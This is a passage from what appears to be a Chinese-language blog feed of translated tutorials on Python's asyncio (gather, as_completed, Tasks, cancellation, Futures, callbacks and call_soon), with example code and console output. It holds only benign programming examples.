class="keyword">in</span> phase <span class="number">0</span></div><div class="line"><span class="keyword">in</span> phase <span class="number">2</span></div><div class="line">done <span class="keyword">with</span> phase <span class="number">0</span></div><div class="line"><span class="number">1</span> completed <span class="keyword">and</span> <span class="number">2</span> pending</div><div class="line">cancelling tasks</div><div class="line">exiting main</div><div class="line">phase <span class="number">1</span> cancelled</div><div class="line">phase <span class="number">2</span> cancelled</div></pre></td></tr></table></figure></p><h3 id="从协程聚集结果"><a href="#从协程聚集结果" class="headerlink" title="从协程聚集结果"></a>从协程聚集结果</h3><p>如果后台的执行步骤是明确的，并且这些执行步骤的结果很重要， 使用gather()等待多个操作可能更有用。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> asyncio</div><div class="line"></div><div class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">phase1</span><span class="params">()</span>:</span></div><div class="line">    print(<span class="string">'in phase1'</span>)</div><div class="line">    <span class="keyword">await</span> asyncio.sleep(<span class="number">2</span>)</div><div class="line">    print(<span class="string">'done with phase1'</span>)</div><div class="line">    <span class="keyword">return</span> <span class="string">'phase1 result'</span></div><div class="line"></div><div class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">phase2</span><span class="params">()</span>:</span></div><div class="line">    print(<span class="string">'in phase2'</span>)</div><div class="line">    <span class="keyword">await</span> asyncio.sleep(<span class="number">1</span>)</div><div class="line">    print(<span class="string">'done with phase2'</span>)</div><div class="line">    <span class="keyword">return</span> <span class="string">'phase2 result'</span></div><div class="line"></div><div class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">    print(<span class="string">'starting main'</span>)</div><div class="line">    print(<span class="string">'waiting for phases to complete'</span>)</div><div class="line">    results = <span class="keyword">await</span> asyncio.gather(phase1(), phase2())</div><div class="line">    print(<span class="string">'results: &#123;!r&#125;'</span>.format(results))</div><div class="line"></div><div class="line">event_loop = asyncio.get_event_loop()</div><div class="line"><span class="keyword">try</span>:</div><div class="line">    event_loop.run_until_complete(main())</div><div class="line"><span class="keyword">finally</span>:</div><div class="line">    event_loop.close()</div></pre></td></tr></table></figure></p><p>通过gather()创建的Tasks没有对外暴露，所以他们不能被取消。返回值是与传递给gather()参数顺序相同的结果列表，不管后台操作实际完成的顺序如何。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">$ python3 asyncio_gather.py</div><div class="line"></div><div class="line">starting main</div><div class="line">waiting <span class="keyword">for</span> phases to complete</div><div class="line"><span class="keyword">in</span> phase2</div><div class="line"><span class="keyword">in</span> phase1</div><div class="line">done <span class="keyword">with</span> phase2</div><div class="line">done <span class="keyword">with</span> phase1</div><div class="line">results: [<span class="string">'phase1 result'</span>, <span class="string">'phase2 result'</span>]</div></pre></td></tr></table></figure></p><h3 id="操作完成时进行处理"><a href="#操作完成时进行处理" class="headerlink" title="操作完成时进行处理"></a>操作完成时进行处理</h3><p>as_completed()是一个生成器函数管理给定的协程列表的执行并且在每一个任务运行完结束都会产生一个结果。和wait()一样，as_completed()是不能保证运行顺序的，但在执行其他操作之前，没有必要等待所有后台操作完成。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> asyncio</div><div class="line"></div><div class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">phase</span><span class="params">(i)</span>:</span></div><div class="line">    print(<span class="string">'in phase &#123;&#125;'</span>.format(i))</div><div class="line">    <span class="keyword">await</span> asyncio.sleep(<span class="number">0.5</span> - (<span class="number">0.1</span> * i))</div><div class="line">    print(<span class="string">'done with phase &#123;&#125;'</span>.format(i))</div><div class="line">    <span class="keyword">return</span> <span class="string">'phase &#123;&#125; result'</span>.format(i)</div><div class="line"></div><div class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(num_phases)</span>:</span></div><div class="line">    print(<span class="string">'starting main'</span>)</div><div class="line">    phases = [phase(i) <span class="keyword">for</span> i <span class="keyword">in</span> range(num_phases)]</div><div class="line">    print(<span class="string">'waiting for phases to complete'</span>)</div><div class="line">    results = []</div><div class="line">    <span class="keyword">for</span> next_to_complete <span class="keyword">in</span> asyncio.as_completed(phases):</div><div class="line">        answer = <span class="keyword">await</span> next_to_complete</div><div class="line">        print(<span class="string">'received answer &#123;!r&#125;'</span>.format(answer))</div><div class="line">        results.append(answer)</div><div class="line">    print(<span class="string">'results: &#123;!r&#125;'</span>.format(results))</div><div class="line">    <span class="keyword">return</span> results</div><div class="line"></div><div class="line">event_loop = asyncio.get_event_loop()</div><div class="line"><span class="keyword">try</span>:</div><div class="line">    event_loop.run_until_complete(main(<span class="number">3</span>))</div><div class="line"><span class="keyword">finally</span>:</div><div class="line">    event_loop.close()</div></pre></td></tr></table></figure></p><p>在这个例子中启动了好几个后台操作，他们完成的顺序与他们开始的顺序相反。当生成器进行消费，事件循环通过await关键字等待协程结果。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">$ python3 asyncio_as_completed.py</div><div class="line"></div><div class="line">starting main</div><div class="line">waiting <span class="keyword">for</span> phases to complete</div><div class="line"><span class="keyword">in</span> phase <span class="number">0</span></div><div class="line"><span class="keyword">in</span> phase <span class="number">2</span></div><div class="line"><span class="keyword">in</span> phase <span class="number">1</span></div><div class="line">done <span class="keyword">with</span> phase <span class="number">2</span></div><div class="line">received answer <span class="string">'phase 2 result'</span></div><div class="line">done <span class="keyword">with</span> phase <span class="number">1</span></div><div class="line">received answer <span class="string">'phase 1 result'</span></div><div class="line">done <span class="keyword">with</span> phase <span class="number">0</span></div><div class="line">received answer <span class="string">'phase 0 result'</span></div><div class="line">results: [<span class="string">'phase 2 result'</span>, <span class="string">'phase 1 result'</span>, <span class="string">'phase 0 result'</span>]</div></pre></td></tr></table></figure></p><p><strong>本文翻译自《The Python3 Standard Library By Example》asyncio相关章节</strong></p></the></excerpt>]]></content>
      
      <categories>
          
          <category> Python编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> asyncio </tag>
            
            <tag> 异步并发 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>asyncio之并发执行Tasks</title>
      <link href="/2017/12/21/asyncio%E4%B9%8B%E5%B9%B6%E5%8F%91%E6%89%A7%E8%A1%8CTasks/"/>
      <url>/2017/12/21/asyncio%E4%B9%8B%E5%B9%B6%E5%8F%91%E6%89%A7%E8%A1%8CTasks/</url>
      <content type="html"><![CDATA[<excerpt in="" index="" |="" 首页摘要=""><p>并发执行Tasks</p><a id="more"></a><the rest="" of="" contents="" |="" 余下全文=""><p>Tasks是与事件循环交互的主要方式之一。Tasks会包装协程并对其运行状态进行追踪。Tasks是Future的子类，所以其他协程也能够等待它们，并且每一个Task在任务完成后都有一个可被检索到的结果。</p><h3 id="启动Task"><a href="#启动Task" class="headerlink" title="启动Task"></a>启动Task</h3><p>为了启动一个Task，可以使用create_task()来创建一个Task实例。只要循环运行并且协程不返回，由此产生的Task将作为由事件循环管理的并发操作的一部分运行。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> asyncio</div><div class="line"></div><div class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">task_func</span><span class="params">()</span>:</span></div><div class="line">    print(<span class="string">'in task_func'</span>)</div><div class="line">    <span class="keyword">return</span> <span class="string">'the result'</span></div><div class="line"></div><div class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(loop)</span>:</span></div><div class="line">    print(<span class="string">'creating task'</span>)</div><div class="line">    task = loop.create_task(task_func())</div><div class="line">    print(<span class="string">'waiting for &#123;!r&#125;'</span>.format(task))</div><div class="line">    return_value = <span class="keyword">await</span> task</div><div class="line">    print(<span class="string">'task completed &#123;!r&#125;'</span>.format(task))</div><div class="line">    print(<span class="string">'return value: &#123;!r&#125;'</span>.format(return_value))</div><div class="line"></div><div class="line">event_loop = asyncio.get_event_loop()</div><div class="line"><span class="keyword">try</span>:</div><div class="line">    event_loop.run_until_complete(main(event_loop))</div><div class="line"><span class="keyword">finally</span>:</div><div class="line">    event_loop.close()</div></pre></td></tr></table></figure></p><p>这个例子中，在main()函数退出之前等待Task返回结果。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">$ python3 asyncio_create_task.py</div><div class="line"></div><div class="line">creating task</div><div class="line">waiting <span class="keyword">for</span> &lt;Task pending coro=&lt;task_func() running at</div><div class="line">asyncio_create_task.py:<span class="number">12</span>&gt;&gt;</div><div class="line"><span class="keyword">in</span> task_func</div><div class="line">task completed &lt;Task finished coro=&lt;task_func() done, defined at</div><div class="line">asyncio_create_task.py:<span class="number">12</span>&gt; result=<span class="string">'the result'</span>&gt;</div><div class="line"><span class="keyword">return</span> value: <span class="string">'the result'</span></div></pre></td></tr></table></figure></p><h3 id="取消Task"><a href="#取消Task" class="headerlink" title="取消Task"></a>取消Task</h3><p>通过保留从create_task()返回的Task对象，可以在完成之前取消Task的操作。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> asyncio</div><div class="line"></div><div class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">task_func</span><span class="params">()</span>:</span></div><div class="line">    print(<span class="string">'in task_func'</span>)</div><div class="line">    <span class="keyword">return</span> <span class="string">'the result'</span></div><div class="line"></div><div class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(loop)</span>:</span></div><div class="line">    print(<span class="string">'creating task'</span>)</div><div class="line">    task = loop.create_task(task_func())</div><div class="line"></div><div class="line">    print(<span class="string">'canceling task'</span>)</div><div class="line">    task.cancel()</div><div class="line"></div><div class="line">    print(<span class="string">'canceled task &#123;!r&#125;'</span>.format(task))</div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        <span class="keyword">await</span> task</div><div class="line">    <span class="keyword">except</span> asyncio.CancelledError:</div><div class="line">        print(<span class="string">'caught error from canceled task'</span>)</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        print(<span class="string">'task result: &#123;!r&#125;'</span>.format(task.result()))</div><div class="line"></div><div class="line">event_loop = asyncio.get_event_loop()</div><div class="line"><span class="keyword">try</span>:</div><div class="line">    event_loop.run_until_complete(main(event_loop))</div><div class="line"><span class="keyword">finally</span>:</div><div class="line">    event_loop.close()</div></pre></td></tr></table></figure></p><p>这个例子中，在启动事件循环之前创建然后又取消了Task，在获取结果时从run_until_complete()中抛出了CancelledError异常。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">$ python3 asyncio_cancel_task.py</div><div class="line"></div><div class="line">creating task</div><div class="line">canceling task</div><div class="line">canceled task &lt;Task cancelling coro=&lt;task_func() running at</div><div class="line">asyncio_cancel_task.py:<span class="number">12</span>&gt;&gt;</div><div class="line">caught error <span class="keyword">from</span> canceled task</div></pre></td></tr></table></figure></p><p>如果一个Task在等待其他并发操作时被取消了，通过在等待的地方引发CancelledError异常来通知Task的取消。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> asyncio</div><div class="line"></div><div class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">task_func</span><span class="params">()</span>:</span></div><div class="line">    print(<span class="string">'in task_func, sleeping'</span>)</div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        <span class="keyword">await</span> asyncio.sleep(<span class="number">1</span>)</div><div class="line">    <span class="keyword">except</span> asyncio.CancelledError:</div><div class="line">        print(<span class="string">'task_func was canceled'</span>)</div><div class="line">        <span class="keyword">raise</span></div><div class="line">    <span class="keyword">return</span> <span class="string">'the result'</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">task_canceller</span><span class="params">(t)</span>:</span></div><div class="line">    print(<span class="string">'in task_canceller'</span>)</div><div class="line">    t.cancel()</div><div class="line">    print(<span class="string">'canceled the task'</span>)</div><div class="line"></div><div class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(loop)</span>:</span></div><div class="line">    print(<span class="string">'creating task'</span>)</div><div class="line">    task = loop.create_task(task_func())</div><div class="line">    loop.call_soon(task_canceller, task)</div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        <span class="keyword">await</span> task</div><div class="line">    <span class="keyword">except</span> asyncio.CancelledError:</div><div class="line">        print(<span class="string">'main() also sees task as canceled'</span>)</div><div class="line"></div><div class="line">event_loop = asyncio.get_event_loop()</div><div class="line"><span class="keyword">try</span>:</div><div class="line">    event_loop.run_until_complete(main(event_loop))</div><div class="line"><span class="keyword">finally</span>:</div><div class="line">    event_loop.close()</div></pre></td></tr></table></figure></p><p>如有必要，捕获异常提供了清理已经完成的工作的机会。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">$ python3 asyncio_cancel_task2.py</div><div class="line"></div><div class="line">creating task</div><div class="line"><span class="keyword">in</span> task_func, sleeping</div><div class="line"><span class="keyword">in</span> task_canceller</div><div class="line">canceled the task</div><div class="line">task_func was canceled</div><div class="line">main() also sees task <span class="keyword">as</span> canceled</div></pre></td></tr></table></figure></p><h3 id="从协程创建Task"><a href="#从协程创建Task" class="headerlink" title="从协程创建Task"></a>从协程创建Task</h3><p>ensure_future()函数返回一个绑定到协程执行的任务。然后可以将Task实例传递给其他代码，在不知道原始协程是如何构造或调用的情况下，可以等待它。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> asyncio</div><div class="line"></div><div class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">wrapped</span><span class="params">()</span>:</span></div><div class="line">    print(<span class="string">'wrapped'</span>)</div><div class="line">    <span class="keyword">return</span> <span class="string">'result'</span></div><div class="line"></div><div class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">inner</span><span class="params">(task)</span>:</span></div><div class="line">    print(<span class="string">'inner: starting'</span>)</div><div class="line">    print(<span class="string">'inner: waiting for &#123;!r&#125;'</span>.format(task))</div><div class="line">    result = <span class="keyword">await</span> task</div><div class="line">    print(<span class="string">'inner: task returned &#123;!r&#125;'</span>.format(result))</div><div class="line"></div><div class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">starter</span><span class="params">()</span>:</span></div><div class="line">    print(<span class="string">'starter: creating task'</span>)</div><div class="line">    task = asyncio.ensure_future(wrapped())</div><div class="line">    print(<span class="string">'starter: waiting for inner'</span>)</div><div class="line">    <span class="keyword">await</span> inner(task)</div><div class="line">    print(<span class="string">'starter: inner returned'</span>)</div><div class="line"></div><div class="line">event_loop = asyncio.get_event_loop()</div><div class="line"><span class="keyword">try</span>:</div><div class="line">    print(<span class="string">'entering event loop'</span>)</div><div class="line">    result = event_loop.run_until_complete(starter())</div><div class="line"><span class="keyword">finally</span>:</div><div class="line">    event_loop.close()</div></pre></td></tr></table></figure></p><p>注意，协程被发送到 ensure_future()时没有被启动，直到对它使用await才允许被执行。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">$ python3 asyncio_ensure_future.py</div><div class="line"></div><div class="line">entering event loop</div><div class="line">starter: creating task</div><div class="line">starter: waiting <span class="keyword">for</span> inner</div><div class="line">inner: starting</div><div class="line">inner: waiting <span class="keyword">for</span> &lt;Task pending coro=&lt;wrapped() running at</div><div class="line">asyncio_ensure_future.py:<span class="number">12</span>&gt;&gt;</div><div class="line">wrapped</div><div class="line">inner: task returned <span class="string">'result'</span></div><div class="line">starter: inner returned</div></pre></td></tr></table></figure></p><p><strong>本文翻译自《The Python3 Standard Library By Example》asyncio相关章节</strong></p></the></excerpt>]]></content>
      
      <categories>
          
          <category> Python编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> asyncio </tag>
            
            <tag> 异步并发 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>asyncio之异步生产结果</title>
      <link href="/2017/12/21/asyncio%E4%B9%8B%E5%BC%82%E6%AD%A5%E7%94%9F%E4%BA%A7%E7%BB%93%E6%9E%9C/"/>
      <url>/2017/12/21/asyncio%E4%B9%8B%E5%BC%82%E6%AD%A5%E7%94%9F%E4%BA%A7%E7%BB%93%E6%9E%9C/</url>
      <content type="html"><![CDATA[<excerpt in="" index="" |="" 首页摘要=""><p>异步生产结果</p><a id="more"></a><the rest="" of="" contents="" |="" 余下全文=""><p>一个Future表示一个工作还未完成的结果对象。事件循环可以监视一个Future对象的状态直到它完成，允许应用程序的一部分等待另一部分完成一些工作。</p><h3 id="等待Future"><a href="#等待Future" class="headerlink" title="等待Future"></a>等待Future</h3><p>一个Future就像一个协程，所以任何用来等待协程的技术也能用来等待Future直到它被标记为完成。这个例子将Future传递给事件循环的run_until_complete()方法。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> asyncio</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">mark_done</span><span class="params">(future, result)</span>:</span></div><div class="line">    print(<span class="string">'setting future result to &#123;!r&#125;'</span>.format(result))</div><div class="line">    future.set_result(result)</div><div class="line"></div><div class="line">event_loop = asyncio.get_event_loop()</div><div class="line"><span class="keyword">try</span>:</div><div class="line">    all_done = asyncio.Future()</div><div class="line"></div><div class="line">    print(<span class="string">'scheduling mark_done'</span>)</div><div class="line">    event_loop.call_soon(mark_done, all_done, <span class="string">'the result'</span>)</div><div class="line"></div><div class="line">    print(<span class="string">'entering event loop'</span>)</div><div class="line">    result = event_loop.run_until_complete(all_done)</div><div class="line">    print(<span class="string">'returned result: &#123;!r&#125;'</span>.format(result))</div><div class="line"><span class="keyword">finally</span>:</div><div class="line">    print(<span class="string">'closing event loop'</span>)</div><div class="line">    event_loop.close()</div><div class="line"></div><div class="line">print(<span class="string">'future result: &#123;!r&#125;'</span>.format(all_done.result()))</div></pre></td></tr></table></figure></p><p>当set_result()被调用时Future的状态被更改了，Future实例保留了给该方法设置的结果。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">$ python3 asyncio_future_event_loop.py</div><div class="line"></div><div class="line">scheduling mark_done</div><div class="line">entering event loop</div><div class="line">setting future result to <span class="string">'the result'</span></div><div class="line">returned result: <span class="string">'the result'</span></div><div class="line">closing event loop</div><div class="line">future result: <span class="string">'the result'</span></div></pre></td></tr></table></figure></p><p>在这个例子中也可以对Future使用await关键字。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> asyncio</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">mark_done</span><span class="params">(future, result)</span>:</span></div><div class="line">    print(<span class="string">'setting future result to &#123;!r&#125;'</span>.format(result))</div><div class="line">    future.set_result(result)</div><div class="line"></div><div class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(loop)</span>:</span></div><div class="line">    all_done = asyncio.Future()</div><div class="line"></div><div class="line">    print(<span class="string">'scheduling mark_done'</span>)</div><div class="line">    loop.call_soon(mark_done, all_done, <span class="string">'the result'</span>)</div><div class="line"></div><div class="line">    result = <span class="keyword">await</span> all_done</div><div class="line">    print(<span class="string">'returned result: &#123;!r&#125;'</span>.format(result))</div><div class="line"></div><div class="line">event_loop = asyncio.get_event_loop()</div><div class="line"><span class="keyword">try</span>:</div><div class="line">    event_loop.run_until_complete(main(event_loop))</div><div class="line"><span class="keyword">finally</span>:</div><div class="line">    event_loop.close()</div></pre></td></tr></table></figure></p><p>Future的结果被await返回，所以可以使用相同的代码来处理协程和Future对象。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">$ python3 asyncio_future_await.py</div><div class="line"></div><div class="line">scheduling mark_done</div><div class="line">setting future result to <span class="string">'the result'</span></div><div class="line">returned result: <span class="string">'the result'</span></div></pre></td></tr></table></figure></p><h3 id="Future回调"><a href="#Future回调" class="headerlink" title="Future回调"></a>Future回调</h3><p>除了跟协程的工作方式很像，Future在运行完成时可以设置回调。回调函数按照他们的被注册顺序被调用。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> asyncio</div><div class="line"><span class="keyword">import</span> functools</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">callback</span><span class="params">(future, n)</span>:</span></div><div class="line">    print(<span class="string">'&#123;&#125;: future done: &#123;&#125;'</span>.format(n, future.result()))</div><div class="line"></div><div class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">register_callbacks</span><span class="params">(all_done)</span>:</span></div><div class="line">    print(<span class="string">'registering callbacks on future'</span>)</div><div class="line">    all_done.add_done_callback(functools.partial(callback, n=<span class="number">1</span>))</div><div class="line">    all_done.add_done_callback(functools.partial(callback, n=<span class="number">2</span>))</div><div class="line"></div><div class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(all_done)</span>:</span></div><div class="line">    <span class="keyword">await</span> register_callbacks(all_done)</div><div class="line">    print(<span class="string">'setting result of future'</span>)</div><div class="line">    all_done.set_result(<span class="string">'the result'</span>)</div><div class="line"></div><div class="line">event_loop = asyncio.get_event_loop()</div><div class="line"><span class="keyword">try</span>:</div><div class="line">    all_done = asyncio.Future()</div><div class="line">    event_loop.run_until_complete(main(all_done))</div><div class="line"><span class="keyword">finally</span>:</div><div class="line">    event_loop.close()</div></pre></td></tr></table></figure></p><p>回调应该只传入一个参数，就是Future实例，为了将参数传入被回调函数中，可以使用functools.partial()进行包装。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">$ python3 asyncio_future_callback.py</div><div class="line"></div><div class="line">registering callbacks on future</div><div class="line">setting result of future</div><div class="line"><span class="number">1</span>: future done: the result</div><div class="line"><span class="number">2</span>: future done: the result</div></pre></td></tr></table></figure></p><p><strong>本文翻译自《The Python3 Standard Library By Example》asyncio相关章节</strong></p></the></excerpt>]]></content>
      
      <categories>
          
          <category> Python编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> asyncio </tag>
            
            <tag> 异步并发 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>asyncio之定时调度常规函数</title>
      <link href="/2017/12/21/asyncio%E4%B9%8B%E5%AE%9A%E6%97%B6%E8%B0%83%E5%BA%A6%E5%B8%B8%E8%A7%84%E5%87%BD%E6%95%B0/"/>
      <url>/2017/12/21/asyncio%E4%B9%8B%E5%AE%9A%E6%97%B6%E8%B0%83%E5%BA%A6%E5%B8%B8%E8%A7%84%E5%87%BD%E6%95%B0/</url>
      <content type="html"><![CDATA[<excerpt in="" index="" |="" 首页摘要=""><p>定时调度常规函数</p><a id="more"></a><the rest="" of="" contents="" |="" 余下全文=""><p>除了管理协程和I/O回调，asyncio事件循环还可以基于循环中的时间计数器值来调度常规函数。</p><h3 id="计划调度“Soon”"><a href="#计划调度“Soon”" class="headerlink" title="计划调度“Soon”"></a>计划调度“Soon”</h3><p>如果回调的时间无关紧要，call_soon()函数可以被用来调度函数执行，函数之后的任何额外的参数都会被传递给被调用的函数。为了将关键字参数传递给回调函数，我们是用functools模块的 partial()函数。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> asyncio</div><div class="line"><span class="keyword">import</span> functools</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">callback</span><span class="params">(arg, *, kwarg=<span class="string">'default'</span>)</span>:</span></div><div class="line">    print(<span class="string">'callback invoked with &#123;&#125; and &#123;&#125;'</span>.format(arg, 